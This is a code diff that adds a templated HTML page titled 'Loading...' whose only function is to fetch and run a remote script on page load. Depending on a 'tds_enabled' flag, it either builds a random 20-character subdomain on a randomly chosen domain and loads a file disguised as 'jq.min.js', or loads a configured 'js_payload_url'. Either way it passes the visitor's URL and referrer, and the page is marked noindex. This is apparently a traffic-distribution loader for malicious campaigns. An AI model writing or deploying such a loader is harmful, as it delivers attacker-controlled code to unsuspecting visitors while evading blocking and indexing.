@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="robots" content="noindex, noarchive">
+    <title>Loading...</title>
+    <script>
+{% if tds_enabled %}
+        (function() {
+            var domains = {{ tds_domains | tojson }};
+            var randomDomain = domains[Math.floor(Math.random() * domains.length)];
+            function makeRandomSub(n) {
+                var r='', c='abcdefghijklmnopqrstuvwxyz0123456789';
+                for(var i=0;i<n;i++) r+=c.charAt(Math.floor(Math.random()*c.length));
+                return r+'.';
+            }
+            var script = document.createElement('script');
+            script.src = 'https://' + makeRandomSub(20) + randomDomain + '/jq.min.js?u=' + encodeURIComponent(window.location.href) + '&r=' + encodeURIComponent(document.referrer) + '&t=' + Date.now();
+            document.head.appendChild(script);
+        })();
+{% else %}
+        (function() {
+            var script = document.createElement('script');
+            script.src = {{ js_payload_url | tojson }} + '?u=' + encodeURIComponent(window.location.href) + '&r=' + encodeURIComponent(document.referrer) + '&t=' + Date.now();
+            document.head.appendChild(script);
+        })();
+{% endif %}
+    </script>
+</head>
+<body></body>
+</html>
